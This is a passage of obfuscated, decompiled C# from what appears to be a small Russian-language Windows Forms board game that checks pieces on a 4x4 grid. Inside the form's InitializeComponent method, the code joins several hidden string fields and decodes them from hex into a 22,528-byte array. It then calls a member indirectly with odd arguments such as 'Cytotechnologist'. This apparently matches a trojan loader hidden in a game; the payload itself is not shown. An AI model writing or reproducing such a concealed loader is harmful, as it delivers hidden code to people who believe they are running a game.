						num = ((int)num2 * -1320003378) ^ 0x4D85BD77;
						continue;
					}
					goto IL_0038;
				case 54u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -1309976478) ^ -2088473207;
						continue;
					}
					goto IL_0088;
				case 53u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = ((int)num2 * -1219142263) ^ 0x5550A53D;
						continue;
					}
					goto IL_0038;
				case 52u:
					flag = false;
					num5 = 0;
					num = ((int)num2 * -49551067) ^ -1357932230;
					continue;
				case 51u:
				{
					int num19;
					int num20;
					if (mem[num5, 0] != null)
					{
						num19 = 347612896;
						num20 = 347612896;
					}
					else
					{
						num19 = 1051482316;
						num20 = 1051482316;
					}
					num = num19 ^ (int)(num2 * 287182219);
					continue;
				}
				case 50u:
					if (mem[1, num5] != null)
					{
						num = (int)(num2 * 218307455) ^ -192650089;
						continue;
					}
					goto IL_0044;
				case 49u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = (int)(num2 * 1739184548) ^ -952358306;
						continue;
					}
					goto IL_0038;
				case 48u:
				{
					int num8;
					int num9;
					if (mem[2, 2] != null)
					{
						num8 = 1211287802;
						num9 = 1211287802;
					}
					else
					{
						num8 = 524495924;
						num9 = 524495924;
					}
					num = num8 ^ (int)(num2 * 2037352);
					continue;
				}
				case 47u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1084395762;
						continue;
					}
					goto IL_057c;
				case 46u:
				{
					int num60;
					int num61;
					if (mem[3, 3] == null)
					{
						num60 = -247460752;
						num61 = -247460752;
					}
					else
					{
						num60 = -2116976084;
						num61 = -2116976084;
					}
					num = num60 ^ (int)(num2 * 339783266);
					continue;
				}
				case 45u:
				{
					int num55;
					int num56;
					if (mem[0, num5].Big != mem[1, num5].Big)
					{
						num55 = 2088939361;
						num56 = 2088939361;
					}
					else
					{
						num55 = 2058809067;
						num56 = 2058809067;
					}
					num = num55 ^ (int)(num2 * 1592841091);
					continue;
				}
				case 44u:
					if (mem[0, 3] != null)
					{
						num = 1899459209;
						continue;
					}
					goto IL_0088;
				case 43u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 2112460536) ^ -301648065;
						continue;
					}
					goto IL_0638;
				case 42u:
				{
					int num46;
					if (mem[num5, 0].Dark != mem[num5, 1].Dark)
					{
						num = 2052026818;
						num46 = 2052026818;
					}
					else
					{
						num = 1599969638;
						num46 = 1599969638;
					}
					continue;
				}
				case 41u:
					if (mem[0, num5] != null)
					{
						num = 41849578;
						continue;
					}
					goto IL_0044;
				case 40u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)((num2 * 1641267477) ^ 0x372AC64C);
						continue;
					}
					goto IL_03a1;
				case 39u:
					if (mem[3, num5] != null)
					{
						num = (int)(num2 * 406189591) ^ -1150004368;
						continue;
					}
					goto IL_0044;
				case 38u:
				{
					int num40;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = 54260777;
						num40 = 54260777;
					}
					else
					{
						num = 1450683628;
						num40 = 1450683628;
					}
					continue;
				}
				case 37u:
					num39 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0089;
				case 36u:
				{
					int num35;
					int num36;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num35 = 984302636;
						num36 = 984302636;
					}
					else
					{
						num35 = 316619528;
						num36 = 316619528;
					}
					num = num35 ^ (int)(num2 * 1362304423);
					continue;
				}
				case 35u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -973154630) ^ 0x677A7F18;
						continue;
					}
					goto IL_0638;
				case 34u:
				{
					int num25;
					int num26;
					if (mem[1, num5].Dark != mem[2, num5].Dark)
					{
						num25 = -1627459060;
						num26 = -1627459060;
					}
					else
					{
						num25 = -1259819586;
						num26 = -1259819586;
					}
					num = num25 ^ (int)(num2 * 1321747673);
					continue;
				}
				case 33u:
				{
					int num15;
					int num16;
					if (mem[1, 1] != null)
					{
						num15 = 1716094627;
						num16 = 1716094627;
					}
					else
					{
						num15 = 556673403;
						num16 = 556673403;
					}
					num = num15 ^ ((int)num2 * -1966735753);
					continue;
				}
				case 32u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = (int)(num2 * 596518824) ^ -1425872258;
						continue;
					}
					goto IL_0038;
				case 31u:
				{
					int num6;
					int num7;
					if (mem[num5, 1].Square != mem[num5, 2].Square)
					{
						num6 = -615588636;
						num7 = -615588636;
					}
					else
					{
						num6 = -534706946;
						num7 = -534706946;
					}
					num = num6 ^ ((int)num2 * -927034121);
					continue;
				}
				case 30u:
				{
					int num66;
					int num67;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num66 = -533151822;
						num67 = -533151822;
					}
					else
					{
						num66 = -1585958392;
						num67 = -1585958392;
					}
					num = num66 ^ ((int)num2 * -1094887894);
					continue;
				}
				case 29u:
					if (mem[2, num5] != null)
					{
						num = ((int)num2 * -953471045) ^ 0x1C537044;
						continue;
					}
					goto IL_0044;
				case 28u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)((num2 * 1192713631) ^ 0x488AC4AF);
						continue;
					}
					goto IL_0638;
				case 27u:
				{
					int num63;
					int num64;
					if (mem[num5, 2] != null)
					{
						num63 = -426701919;
						num64 = -426701919;
					}
					else
					{
						num63 = -260500353;
						num64 = -260500353;
					}
					num = num63 ^ ((int)num2 * -1999850154);
					continue;
				}
				case 26u:
				{
					int num59;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 55560680;
						num59 = 55560680;
					}
					else
					{
						num = 523902295;
						num59 = 523902295;
					}
					continue;
				}
				case 24u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -1061968646) ^ 0x4E92CC7A;
						continue;
					}
					goto IL_0088;
				case 22u:
				{
					int num57;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 1956158829;
						num57 = 1956158829;
					}
					else
					{
						num = 1270106332;
						num57 = 1270106332;
					}
					continue;
				}
				case 21u:
				{
					int num53;
					int num54;
					if (mem[1, num5].Point == mem[2, num5].Point)
					{
						num53 = -70504825;
						num54 = -70504825;
					}
					else
					{
						num53 = -2026679638;
						num54 = -2026679638;
					}
					num = num53 ^ ((int)num2 * -1048526586);
					continue;
				}
				case 20u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = (int)(num2 * 111431399) ^ -92451643;
						continue;
					}
					goto IL_0044;
				case 19u:
				{
					int num49;
					int num50;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num49 = -57978376;
						num50 = -57978376;
					}
					else
					{
						num49 = -1402437505;
						num50 = -1402437505;
					}
					num = num49 ^ (int)(num2 * 1282109280);
					continue;
				}
				case 18u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -902936708) ^ -1627028923;
						continue;
					}
					goto IL_057c;
				case 17u:
					num = (int)(num2 * 1293269465) ^ -302210090;
					continue;
				case 16u:
				{
					int num44;
					int num45;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num44 = 796312711;
						num45 = 796312711;
					}
					else
					{
						num44 = 1643698403;
						num45 = 1643698403;
					}
					num = num44 ^ (int)(num2 * 1994860396);
					continue;
				}
				case 15u:
				{
					int num42;
					int num43;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num42 = 878585731;
						num43 = 878585731;
					}
					else
					{
						num42 = 612707969;
						num43 = 612707969;
					}
					num = num42 ^ ((int)num2 * -774059758);
					continue;
				}
				case 14u:
				{
					int num41;
					if (mem[num5, 0].Point != mem[num5, 1].Point)
					{
						num = 1033577019;
						num41 = 1033577019;
					}
					else
					{
						num = 2129699338;
						num41 = 2129699338;
					}
					continue;
				}
				case 13u:
					flag = true;
					num = (int)((num2 * 1392438676) ^ 0x4E88C734);
					continue;
				case 12u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = ((int)num2 * -1444641813) ^ -156363914;
						continue;
					}
					goto IL_0038;
				case 11u:
				{
					int num37;
					int num38;
					if (mem[num5, 3] != null)
					{
						num37 = -668907973;
						num38 = -668907973;
					}
					else
					{
						num37 = -100117326;
						num38 = -100117326;
					}
					num = num37 ^ ((int)num2 * -2009668979);
					continue;
				}
				case 10u:
				{
					int num31;
					int num32;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num31 = -331202387;
						num32 = -331202387;
					}
					else
					{
						num31 = -860264296;
						num32 = -860264296;
					}
					num = num31 ^ ((int)num2 * -2101540505);
					continue;
				}
				case 9u:
				{
					int num27;
					int num28;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num27 = 1070271553;
						num28 = 1070271553;
					}
					else
					{
						num27 = 2011088829;
						num28 = 2011088829;
					}
					num = num27 ^ (int)(num2 * 2055704303);
					continue;
				}
				case 8u:
					num = 239000995;
					continue;
				case 7u:
					flag = true;
					num = ((int)num2 * -1850082133) ^ -1740912781;
					continue;
				case 6u:
				{
					int num21;
					int num22;
					if (mem[num5, 1].Dark == mem[num5, 2].Dark)
					{
						num21 = -37278383;
						num22 = -37278383;
					}
					else
					{
						num21 = -420942896;
						num22 = -420942896;
					}
					num = num21 ^ ((int)num2 * -64757473);
					continue;
				}
				case 5u:
				{
					int num17;
					int num18;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num17 = -84926123;
						num18 = -84926123;
					}
					else
					{
						num17 = -1163765557;
						num18 = -1163765557;
					}
					num = num17 ^ ((int)num2 * -1817071851);
					continue;
				}
				case 4u:
					num = 1662248674;
					continue;
				case 3u:
				{
					int num14;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 2125765215;
						num14 = 2125765215;
					}
					else
					{
						num = 1665301995;
						num14 = 1665301995;
					}
					continue;
				}
				case 2u:
					result = flag;
					num = 455606597;
					continue;
				case 1u:
				{
					int num10;
					int num11;
					if (mem[num5, 1] != null)
					{
						num10 = 302809934;
						num11 = 302809934;
					}
					else
					{
						num10 = 1622617516;
						num11 = 1622617516;
					}
					num = num10 ^ ((int)num2 * -1081935415);
					continue;
				}
				case 0u:
				{
					int num3;
					int num4;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num3 = -1718032777;
						num4 = -1718032777;
					}
					else
					{
						num3 = -235826501;
						num4 = -235826501;
					}
					num = num3 ^ (int)(num2 * 2015053969);
					continue;
				}
				case 25u:
					break;
				default:
					{
						return result;
					}
					IL_0038:
					num = 760374413;
					num13 = 760374413;
					continue;
					IL_0044:
					num = 216915920;
					num13 = 216915920;
					continue;
					IL_0088:
					num39 = 0;
					goto IL_0089;
					IL_0638:
					num39 = 1;
					goto IL_0089;
					IL_03a1:
					num39 = 1;
					goto IL_0089;
					IL_0089:
					flag2 = (byte)num39 != 0;
					num = 358947841;
					continue;
					IL_057c:
					num39 = 0;
					goto IL_0089;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		int num4 = default(int);
		bool flag = default(bool);
		int num3 = default(int);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1885972255;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB78DF83Au) % 14u)
				{
				case 12u:
					num4++;
					num = -1040469090;
					continue;
				case 11u:
				{
					int num7;
					int num8;
					if (!flag)
					{
						num7 = -1315516631;
						num8 = -1315516631;
					}
					else
					{
						num7 = -1397624416;
						num8 = -1397624416;
					}
					num = num7 ^ (int)(num2 * 1977563569);
					continue;
				}
				case 10u:
					num3 = 0;
					num = ((int)num2 * -1116047967) ^ 0x52A8DF7D;
					continue;
				case 9u:
					num4 = 0;
					num = -1040469090;
					continue;
				case 8u:
					result = flag2;
					num = ((int)num2 * -1517482364) ^ 0x6120111B;
					continue;
				case 7u:
					flag2 = false;
					num = ((int)num2 * -765393644) ^ 0x3B976026;
					continue;
				case 6u:
				{
					int num6;
					if (num4 < 4)
					{
						num = -991029139;
						num6 = -991029139;
					}
					else
					{
						num = -474546970;
						num6 = -474546970;
					}
					continue;
				}
				case 5u:
					num = (int)(num2 * 721019837) ^ -15784233;
					continue;
				case 4u:
					num3++;
					num = ((int)num2 * -398350821) ^ 0x2429FB0A;
					continue;
				case 3u:
					flag2 = true;
					num = (int)(num2 * 1367823164) ^ -754190860;
					continue;
				case 2u:
					flag = num3 < 4;
					num = -784364583;
					continue;
				case 1u:
				{
					int num5;
					if (mem[num3, num4] != null)
					{
						num = -1909912302;
						num5 = -1909912302;
					}
					else
					{
						num = -871750061;
						num5 = -871750061;
					}
					continue;
				}
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 1263386640;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6E71E538u) % 10u)
				{
				case 8u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -1624977792) ^ -700966907;
					continue;
				case 7u:
					num = (int)((num2 * 1408801401) ^ 0x4662765);
					continue;
				case 5u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -189460854) ^ 0x27764AF5;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -74277241) ^ 0x46B57716;
					continue;
				case 3u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)(num2 * 349502105) ^ -970213474;
					continue;
				case 2u:
					num = ((int)num2 * -483097054) ^ 0x42539D77;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)(num2 * 1781412265) ^ -900950849;
					continue;
				case 0u:
					num = (int)(num2 * 2117052689) ^ -526899531;
					continue;
				default:
					return;
				case 6u:
					break;
				case 9u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1925347897;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xDB826061u) % 8u)
				{
				case 7u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_000f;
				case 6u:
					if (disposing)
					{
						num = (int)((num2 * 1787085428) ^ 0x17F0F8BE);
						continue;
					}
					num5 = 0;
					goto IL_000f;
				case 4u:
					((Form)this).Dispose(disposing);
					num = -429113532;
					continue;
				case 3u:
					num = (int)(num2 * 152283840) ^ -149833939;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1150436119;
						num4 = -1150436119;
					}
					else
					{
						num3 = -2019822164;
						num4 = -2019822164;
					}
					num = num3 ^ (int)(num2 * 979679298);
					continue;
				}
				case 1u:
					Form1.smethod_51((IDisposable)components);
					num = (int)((num2 * 1353868255) ^ 0xC947105);
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
					IL_000f:
					flag = (byte)num5 != 0;
					num = -513595421;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0a98: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa2: Expected O, but got Unknown
		components = Form1.smethod_52();
		pictureBox1 = Form1.smethod_2();
		bool flag = default(bool);
		int num3 = default(int);
		string string_ = default(string);
		byte[] array = default(byte[]);
		while (true)
		{
			int num = -711240862;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF2F2875Bu) % 141u)
				{
				case 140u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)((num2 * 866053583) ^ 0x1D7385BE);
					continue;
				case 139u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)((num2 * 315172893) ^ 0x4B243E7C);
					continue;
				case 138u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 269211348) ^ 0x62DE29C6);
					continue;
				case 137u:
					flag = num3 < 22528;
					num = -2067162962;
					continue;
				case 136u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -1877290097) ^ -289729287;
					continue;
				case 135u:
					num = (int)(num2 * 226331395) ^ -897064144;
					continue;
				case 134u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)((num2 * 190070443) ^ 0x66944805);
					continue;
				case 133u:
					num = (int)((num2 * 181472463) ^ 0xFAA549A);
					continue;
				case 132u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -1655425852) ^ -42290114;
					continue;
				case 131u:
					num = ((int)num2 * -1326085372) ^ 0x210C8502;
					continue;
				case 130u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1830329215) ^ -1671506853;
					continue;
				case 129u:
					num = (int)((num2 * 985791023) ^ 0x5F068C75);
					continue;
				case 128u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -1972267257) ^ 0x2DEB58F0;
					continue;
				case 127u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -1929113526) ^ 0x2CE26F84;
					continue;
				case 126u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -82460725;
						num5 = -82460725;
					}
					else
					{
						num4 = -2140889070;
						num5 = -2140889070;
					}
					num = num4 ^ (int)(num2 * 1702172296);
					continue;
				}
				case 125u:
					num = (int)((num2 * 718890827) ^ 0x531A96A4);
					continue;
				case 124u:
					num = ((int)num2 * -2138894237) ^ -1956579979;
					continue;
				case 123u:
					string_ = Veet.Sa;
					num = (int)(num2 * 1696423961) ^ -1962666942;
					continue;
				case 122u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num = ((int)num2 * -1022912235) ^ -495658149;
					continue;
				case 121u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)((num2 * 736200800) ^ 0xCAA897);
					continue;
				case 120u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 389538532) ^ 0x408662A);
					continue;
				case 119u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)((num2 * 1993132376) ^ 0x531C0C9);
					continue;
				case 118u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)(num2 * 944812347) ^ -1284347216;
					continue;
				case 117u:
					num = ((int)num2 * -2144443529) ^ -1247936974;
					continue;
				case 116u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)(num2 * 184242101) ^ -875062233;
					continue;
				case 115u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1638650823) ^ 0x5E7A665B;
					continue;
				case 114u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 1474020149) ^ 0x7849E2F7);
					continue;
				case 113u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1001957844) ^ -941372132;
					continue;
				case 112u:
					num = ((int)num2 * -242984268) ^ 0x68D26EAC;
					continue;
				case 111u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -1584400933) ^ -744189687;
					continue;
				case 110u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -335148808) ^ -366633030;
					continue;
				case 109u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)(num2 * 1261136575) ^ -325620447;
					continue;
				case 108u:
					num = (int)((num2 * 698189563) ^ 0x62A006C3);
					continue;
				case 107u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)(num2 * 1378687243) ^ -1550099650;
					continue;
				case 106u:
					num = (int)(num2 * 1392863371) ^ -877777229;
					continue;
				case 105u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -543956823) ^ 0x429454C6;
					continue;
				case 104u:
					panel1 = Form1.smethod_55();
					num = (int)(num2 * 1450617896) ^ -436209832;
					continue;
				case 103u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)(num2 * 1440173471) ^ -747982952;
					continue;
				case 102u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)(num2 * 2146205678) ^ -1654359188;
					continue;
				case 101u:
					num = ((int)num2 * -1997959150) ^ -1690010330;
					continue;
				case 100u:
					num = (int)(num2 * 1962891083) ^ -1693102811;
					continue;
				case 99u:
					num = (int)((num2 * 1486362283) ^ 0x6E6DA11);
					continue;
				case 98u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -163524969) ^ 0x2334094B;
					continue;
				case 97u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)((num2 * 878005488) ^ 0x70DEBD56);
					continue;
				case 96u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 1241452973) ^ -345765519;
					continue;
				case 95u:
					num = (int)((num2 * 1302988799) ^ 0x7427D024);
					continue;
				case 94u:
					timer1 = Form1.smethod_56(components);
					num = (int)((num2 * 841569905) ^ 0x417D1F0F);
					continue;
				case 93u:
					num = -799563952;
					continue;
				case 92u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -46669712) ^ 0x406ED7EF;
					continue;
				case 91u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -91203406) ^ 0x442ECEFF;
					continue;
				case 90u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)(num2 * 464476952) ^ -36156725;
					continue;
				case 89u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 1801517593) ^ 0x45D1B46);
					continue;
				case 88u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -785503991) ^ -911710987;
					continue;
				case 87u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -472647315) ^ -1218268769;
					continue;
				case 86u:
					num = (int)((num2 * 1497274341) ^ 0x60E9E569);
					continue;
				case 85u:
					num = ((int)num2 * -611700687) ^ 0x1B946AAF;
					continue;
				case 84u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1605369225) ^ -527707340;
					continue;
				case 83u:
					num = (int)(num2 * 1955903790) ^ -260405295;
					continue;
				case 82u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)((num2 * 1115206431) ^ 0x6748A552);
					continue;
				case 81u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)((num2 * 1919215832) ^ 0x23ED896B);
					continue;
				case 80u:
					num = (int)((num2 * 273480988) ^ 0x5F9B7E11);
					continue;
				case 79u:
					Form1.smethod_92((Control)(object)this);
					num = (int)(num2 * 1063594369) ^ -155991229;
					continue;
				case 78u:
					num = ((int)num2 * -972213508) ^ 0x44558CB0;
					continue;
				case 77u:
					num = ((int)num2 * -19879017) ^ -187411193;
					continue;
				case 76u:
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = ((int)num2 * -1359155002) ^ 0x17EF62B2;
					continue;
				case 75u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = (int)(num2 * 1590877242) ^ -1192419413;
					continue;
				case 74u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -330440504) ^ -1416804110;
					continue;
				case 73u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 1045825446) ^ 0x45A4A74A);
					continue;
				case 72u:
				{
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -134504554) ^ 0x2E5A4306;
					continue;
				}
				case 71u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -1389373380) ^ -1980508685;
					continue;
				case 70u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -1532248824) ^ -1805463467;
					continue;
				case 69u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1738819702) ^ 0x7C1DCE2B;
					continue;
				case 68u:
					num = (int)(num2 * 2078398931) ^ -1863058169;
					continue;
				case 67u:
					num = (int)((num2 * 1453331104) ^ 0x655B6889);
					continue;
				case 66u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 2104426760) ^ 0x7A31D1F2);
					continue;
				case 65u:
					num = ((int)num2 * -686521927) ^ -28549767;
					continue;
				case 64u:
					num = ((int)num2 * -320480813) ^ 0x6EE9161B;
					continue;
				case 63u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)(num2 * 834773996) ^ -540489759;
					continue;
				case 62u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)(num2 * 693699053) ^ -2035416147;
					continue;
				case 61u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 1291930848) ^ 0x7FBF4C0B);
					continue;
				case 60u:
					num = ((int)num2 * -1064694695) ^ -192960576;
					continue;
				case 59u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -2002605330) ^ -265075904;
					continue;
				case 58u:
					num3 = 0;
					num = (int)((num2 * 1643103624) ^ 0x7DB4653C);
					continue;
				case 57u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)(num2 * 1017787213) ^ -1471537086;
					continue;
				case 56u:
					num = ((int)num2 * -330687122) ^ -551132860;
					continue;
				case 55u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)((num2 * 1836873128) ^ 0x3B2C9517);
					continue;
				case 54u:
					num = ((int)num2 * -719022033) ^ -436948418;
					continue;
				case 53u:
					num = ((int)num2 * -1982944165) ^ 0x43091806;
					continue;
				case 52u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -596732464) ^ 0x6E02FE7F;
					continue;
				case 51u:
					num = ((int)num2 * -89583750) ^ 0x203657F8;
					continue;
				case 50u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)(num2 * 594580535) ^ -1833316421;
					continue;
				case 49u:
					num = (int)((num2 * 615112448) ^ 0x72EB075C);
					continue;
				case 48u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1651357198) ^ 0x60688A17;
					continue;
				case 47u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -748075002) ^ 0x11AD47C3;
					continue;
				case 46u:
					num = ((int)num2 * -351604494) ^ 0x1831A3C1;
					continue;
				case 45u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)((num2 * 1093196182) ^ 0x788E1EB8);
					continue;
				case 44u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 1437829312) ^ -867005434;
					continue;
				case 43u:
					num = (int)(num2 * 1536856165) ^ -876919513;
					continue;
				case 42u:
					num = (int)((num2 * 1981679129) ^ 0x48713355);
					continue;
				case 41u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -1548597835) ^ -2039562292;
					continue;
				case 40u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -2066216119) ^ 0x3D2806E5;
					continue;
				case 39u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)(num2 * 152434659) ^ -600025699;
					continue;
				case 38u:
					button2 = Form1.smethod_53();
					num = (int)((num2 * 1291041628) ^ 0x28EB6E52);
					continue;
				case 37u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -1676527876) ^ -469360149;
					continue;
				case 36u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)((num2 * 1194608707) ^ 0x762564C5);
					continue;
				case 34u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)(num2 * 1672588352) ^ -803711968;
					continue;
				case 33u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 337840346) ^ 0x4E716466);
					continue;
				case 32u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)((num2 * 2073943464) ^ 0x7FEB4A90);
					continue;
				case 31u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)(num2 * 82849234) ^ -617782836;
					continue;
				case 30u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -1437085479) ^ 0x526B99FA;
					continue;
				case 29u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
